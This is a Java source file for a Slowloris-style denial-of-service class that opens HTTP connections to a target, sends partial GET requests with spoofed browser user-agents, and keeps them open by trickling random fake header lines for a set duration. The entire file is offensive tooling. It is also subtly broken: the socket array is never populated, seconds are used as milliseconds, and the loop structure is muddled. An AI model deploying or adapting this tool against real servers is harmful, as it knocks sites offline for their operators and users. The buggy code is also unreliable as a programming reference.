package pkgData;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.util.Random;

public class SlowLorris implements Runnable
{
	private URL host;
	private int numberOfConnections;
	private int port;
	private int timeout;
	private Socket[] sockets;
	private String[] requests;
	private int duration;

	public SlowLorris(String target, int numberOfConnections, int port, int timeoutSecs, int durationSecs) throws MalformedURLException
	{
		super();
		String targetPrefix = target.startsWith("http://") ? "" : "http://";
		host = new URL(targetPrefix + target);
		this.numberOfConnections = numberOfConnections;
		this.port = port;
		this.timeout = timeoutSecs;
		this.duration = durationSecs;
	}

	@Override
	public void run()
	{
		sockets = new Socket[numberOfConnections];
		requests = new String[numberOfConnections];
		requests = createInitialPartialRequests();
		long startTime = System.currentTimeMillis();
		for (int i = 0; i < numberOfConnections; i++)
		{
			try
			{
				sendPartialrequest(i);
				Thread.sleep(timeout);
				while (System.currentTimeMillis() - startTime < duration * 1000)
					atatck();
				closeConnections();
			} catch (IOException | InterruptedException e)
			{
				e.printStackTrace();
			}
		}

	}

	private void closeConnections() throws IOException
	{
		for (int i = 0; i < sockets.length; i++)
		{
			sockets[i].close();
		}

	}

	private void atatck() throws InterruptedException, IOException
	{
		for (int i = 0; i < sockets.length; i++)
		{
			sendFalseHeader(i);
			Thread.sleep(new Random().nextInt(timeout));

		}

	}

	private void sendFalseHeader(int i) throws IOException
	{
		char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
		String fake = alphabet[new Random().nextInt(alphabet.length)] + "-"
				+ alphabet[new Random().nextInt(alphabet.length)] + new Random().nextInt() + "\r\n";
		sockets[i].getOutputStream().write(fake.getBytes());

	}

	private void sendPartialrequest(int idx) throws IOException
	{
		sockets[idx].getOutputStream().write(requests[new Random().nextInt(numberOfConnections)].getBytes());
	}

	private String[] createInitialPartialRequests()
	{
		String pagePrefix = "/";
		if (host.getPath().startsWith("/"))
			pagePrefix = "";

		String type = "GET " + pagePrefix + host.getPath() + " HTTP/1.1\r\n";
		String hostTemp = "Host: " + host.getHost() + (port == 80 ? "" : ":" + port) + "\r\n";
		String contentType = "Content-Type: */* \r\n";
		String connection = "Connection: keep-alive\r\n";

		String[] agents = {
				"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
				"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.0.9) Gecko/2009040821",
				"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
				"Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818",
				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
				"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
				"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
				"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
				"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
				"Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
				"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
				"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" };

		String[] allPartials = new String[numberOfConnections];
		for (int i = 0; i < numberOfConnections; i++)
			allPartials[i] = type + hostTemp + contentType + connection + agents[new Random().nextInt(agents.length)]
					+ "\r\n";

		return allPartials;
	}

}
